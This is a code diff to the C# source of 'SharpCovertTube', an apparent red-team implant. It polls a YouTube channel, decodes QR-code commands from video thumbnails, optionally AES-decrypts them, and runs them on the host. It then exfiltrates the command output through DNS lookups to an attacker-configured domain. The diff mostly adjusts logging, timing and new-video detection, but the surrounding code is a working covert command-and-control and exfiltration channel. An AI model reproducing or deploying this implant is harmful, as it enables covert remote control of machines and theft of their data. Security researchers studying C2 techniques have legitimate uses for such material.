@@ -14,13 +14,13 @@ namespace SharpCovertTube
 {
     internal class Program
     {
-        // FILL VALUES
+        // Configuration values
         public const string channel_id = "";
         public const string api_key = "";
         public const string payload_aes_key = "0000000000000000";
         public const string payload_aes_iv = "0000000000000000";
         public const string dns_hostname = ".test.org";
-        public const int seconds_delay = 60;
+        public const int seconds_delay = 120;
 
 
         static string ByteArrayToStr(byte[] DataArray)
@@ -50,12 +50,10 @@ namespace SharpCovertTube
 
         static string ReadQR(string thumbnail_url)
         {
-            Console.WriteLine("[+] Request to {0}", thumbnail_url);
             var client = new WebClient();
             var stream = client.OpenRead(thumbnail_url);
             if (stream == null) return "";
             Bitmap bitmap_from_image = new Bitmap(stream);
-            Console.WriteLine("[+] Reading QR from {0}", thumbnail_url);
             string decoded_cmd = DecodeQR(bitmap_from_image);
             return decoded_cmd;
         }
@@ -130,7 +128,7 @@ namespace SharpCovertTube
                 {
                     string exfil_hostname = response_portion + dns_hostname;
                     exfil_hostname = exfil_hostname.Replace("=", "");
-                    Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
+                    Console.WriteLine("[+] DNS lookup against:\t\t\t{0}", exfil_hostname);
                     Dns.GetHostAddresses(exfil_hostname);
                 }
                 catch (Exception e)
@@ -149,8 +147,6 @@ namespace SharpCovertTube
             try {
                 // Base64-decode
                 string base64_decoded = Base64Decode(payload);
-                Console.WriteLine("[+] Base64-decoded:\t{0}", base64_decoded);
-
                 string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                 Console.WriteLine("[+] Payload was AES-encrypted");
                 return decrypted_cmd;
@@ -164,21 +160,21 @@ namespace SharpCovertTube
 
         static void ReadVideo(string video_id, string channel_url)
         {
-            Console.WriteLine("[+] Reading video with ID {0}", video_id);
+            Console.WriteLine("[+] Reading new video with ID: \t\t{0}", video_id);
             string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
             
             // Read QR
             string qr_decoded_cmd = ReadQR(thumbnail_url);
-            Console.WriteLine("[+] Value decoded from QR:\t{0}", qr_decoded_cmd);
+            Console.WriteLine("[+] Value decoded from QR:\t\t{0}", qr_decoded_cmd);
 
             // Decrypt in case it is AES-encrypted
             string decrypted_cmd = TryDecrypt(qr_decoded_cmd); 
-            Console.WriteLine("[+] After trying to AES-decrypt:\t{0}", decrypted_cmd);
+            Console.WriteLine("[+] Value after trying to AES-decrypt:\t{0}", decrypted_cmd);
 
             // Execute command
             string response_cmd = ExecuteCommand(decrypted_cmd);
             response_cmd.Trim();
-            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
+            Console.WriteLine("[+] Response from command:\t\t{0}", response_cmd);
 
             // Exfiltrate
             DNSExfil(response_cmd);
@@ -221,26 +217,24 @@ namespace SharpCovertTube
             int number_of_videos = Initial_VideoIds.Count;
             foreach (string value in Initial_VideoIds)
             {
-                Console.WriteLine("[+] Video already uploaded with ID: \t{0}", value);
+                Console.WriteLine("[+] Video already uploaded with ID {0}", value);
             }
 
             while (true)
             {
                 // Sleep
-                Console.WriteLine("[+] Sleeping {0} seconds \n", seconds_delay);
+                Console.WriteLine("[+] {0} - Sleeping {1} seconds\n", DateTime.Now.ToString("HH:mm:ss").ToString(), seconds_delay);
                 System.Threading.Thread.Sleep(1000 * seconds_delay);
 
                 // Get list of videos
                 List<string> VideoIds = GetVideoIds(channel_url);
+                var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                 // If new videos -> Read
-                if (VideoIds.Count > number_of_videos)
-                {
-                    Console.WriteLine("[+] New videos uploaded!");
+                if (firstNotSecond != null && firstNotSecond.Any()) {
+                    Console.WriteLine("[+] New video(s) uploaded!");
 
-                    var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                     foreach (var video_id in firstNotSecond)
                     {
-                        Console.WriteLine("[+] New ID: \t{0}", video_id);
                         ReadVideo(video_id, channel_url);
                     }
 
@@ -250,7 +244,7 @@ namespace SharpCovertTube
                 // No new videos
                 else
                 {
-                    Console.WriteLine("[+] No new videos... Total: {0}", VideoIds.Count);
+                    Console.WriteLine("[+] No new videos... Total number of uploaded videos: \t{0}", VideoIds.Count);
                 }
             }
         }
@@ -289,8 +283,13 @@ namespace SharpCovertTube
 
         static void Main(string[] args)
         {
+            if (channel_id == "" || api_key == "") {
+                Console.WriteLine("[+] It is necessary to fill the channel_id and api_key values before running the program.");
+                System.Environment.Exit(0);
+            }
+            Console.WriteLine("[+] Monitoring Youtube channel with id {0}", channel_id);
             string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
-            Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);
+            // Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);
             MonitorChannel(channel_url, seconds_delay);
         }
     }
